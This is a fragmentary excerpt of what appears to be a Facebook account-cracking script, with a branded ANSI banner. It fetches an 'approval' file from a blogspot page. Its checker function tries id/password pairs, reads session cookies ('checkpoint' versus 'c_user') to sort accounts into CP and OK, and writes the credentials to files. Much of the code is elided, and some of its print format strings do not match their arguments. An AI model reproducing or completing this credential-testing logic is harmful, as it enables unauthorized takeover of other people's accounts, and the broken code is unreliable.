...
def uaku():
	try:
		...
		a=requests.get('https://safwanislam5129.blogspot.com/2023/11/approvaltxt.html').text
		ua=open('.bbnew.txt','w')
...
\033[1;32m==================================================
          ...
          Telegram   : CHALAI NA
          Facebook   : JOMIDAR
          Github     : SAFWAN GAINING 
          Version    : \033[1;96mFREE//0.4\x1b[0m\033[1;31m [Updated] \x1b[0m
\033[1;31m==================================================           
\x1b[0;97m\x1b[1;43m         ðŸ  SAFWAN ISLAM IS A BRAND ðŸ¥°          \x1b[0m
""")
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%s++++ %s|%sSAFU ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s++++ SAFU ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ SAFU----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SAFU     %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
